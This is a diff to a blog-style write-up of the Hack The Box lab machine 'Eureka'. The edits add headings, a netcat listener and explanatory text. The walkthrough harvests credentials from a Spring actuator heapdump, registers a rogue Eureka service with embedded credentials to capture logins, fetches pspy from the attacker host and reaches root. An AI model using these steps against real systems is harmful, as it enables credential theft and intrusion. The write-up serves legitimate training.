@@ -8,6 +8,24 @@ image:
   path: assets/HTB/Eureka/image1.png
 ---
 
+<table style="width:100%; table-layout:fixed; text-align:center;">
+  <tr>
+    <th>Machine</th>
+    <th>Difficulty</th>
+    <th>OS</th>
+    <th>Release</th>
+    <th></th>
+  </tr>
+  <tr>
+    <td>Eureka</td>
+    <td>Easy</td>
+    <td>Linux/Windows</td>
+    <td>Jul 2025</td>
+    <td><img src="assets/HTB/Eureka/image1.png" alt="Logo" width="80"></td>
+  </tr>
+</table>
+
+## Recon
 
 Started off with an Nmap scan.
 
@@ -134,6 +152,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ```
 
+SSH is open on port 22, a web server is running on port 80 with nginx, and port 8761 is also open running an unknown web service that requires HTTP Basic Authentication.
+
 Updated the `/etc/hosts` file.
 
 ```
@@ -154,6 +174,8 @@ http://furni.htb
 
 
 ## Enumeration
+
+We use Dirsearch to enumerate the web server and discover different endpoints or directories available on the target.
 
 ```bash
 dirsearch -u http://furni.htb/ -e php,html,txt -x 400,403,404 -t 50 
@@ -247,7 +269,7 @@ curl -o heapdump.hprof http://furni.htb/actuator/heapdump
 
 ```
 
-Analyzed the file using `heapdump_analyzer` (a self-created tool) to extract sensitive information.
+Analyzed the file using **[heapdump_analyzer](https://github.com/furious-05/Heapdump-Analyzer)** (a self-created tool) to extract sensitive information.
 ```
 python3 heapdump_analyzer.py -f heapdump.hprof --all 
 ```
@@ -278,6 +300,7 @@ python3 heapdump_analyzer.py -f heapdump.hprof --all
 [+] TEXT report saved to heapdump_forensic_report_20250428_074922.text
 ```
 
+After analyzing the heap dump file and identifying patterns, we extracted credentials for the user `oscat192`.
 
 <img src="assets/HTB/Eureka/image5.png" alt="Error Loading image"/>
 
@@ -286,6 +309,8 @@ python3 heapdump_analyzer.py -f heapdump.hprof --all
 <img src="assets/HTB/Eureka/image6.png" alt="Error Loading image"/>
 
 ## Initial Access
+
+Using the extracted credentials, we were able to gain initial access to the system.
 
 ```
 ssh oscar190@10.10.11.66
@@ -329,7 +354,7 @@ oscar190@eureka:~$
 
 ```
 
-Here we can see the running ports
+### Listening Services and Open Ports
 
 ```
 ss -tulnp
@@ -365,6 +390,9 @@ Here we have an interesting port `8761`, which is not accessible externally. Add
 ```
 tcp LISTEN *:8761
 ```
+
+
+### Internal Database Access
 
 Login to mysql using
 
@@ -452,8 +480,9 @@ MariaDB [Furni_WebApp_DB]> select first_name,last_name,password  from users;
 9 rows in set (0.000 sec)
 
 ```
+## Web (Port 8761)
 
-We were not able to crack the password.
+We were unable to crack the passwords from the database. However, we already obtained valid credentials earlier from the JSON file using the Heapdump Analyzer. These credentials can be used to log in to the application.
 
 ```
 http://furni.htb:8761
@@ -556,6 +585,12 @@ Used the following payload:
 
   }
 ```
+Before sending the request, we set up a listener to capture the response and interact with the system once the request is processed.
+
+```
+nc -nlvp 8081
+```
+
 <img src="/assets/HTB/Eureka/image9.png" alt="Error Loading image"/>
 
 After sending the payload, we received the credentials on our listener.
@@ -608,6 +643,7 @@ curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@127.0.0.1:8761/eureka/apps/USER
 }'
 ```
 
+## Access as Miranda Wise
 
 Logged in through SSH using the following credentials:
 
@@ -660,9 +696,9 @@ miranda-wise@eureka:~$
 
 ## Privilege Escalation
 
-#### Upload pspy64 to Remote SSH
+For privilege escalation, we use [pspy64](https://github.com/DominicBreuker/pspy) to monitor running processes and identify any that can be exploited without requiring root permissions.
 
-To upload `pspy64.py` to the remote SSH, follow these steps:
+
 
 1. Start a local HTTP server to serve the file:
 
@@ -675,14 +711,6 @@ python3 -m http.server 8000
 ```bash
 wget http://<tun0-ip>:8000/pspy64
 ```
-
-3. Make the file executable:
-
-```bash
-chmod +x pspy64
-```
-
-4. Finally, run the tool:
 
 ```bash
 ./pspy64
@@ -836,4 +864,3 @@ bash-5.0# cat root.txt
 bash-5.0# 
 
 ```
-<img src="/assets/HTB/Eureka/image10.png" alt="Error Loading image"/>
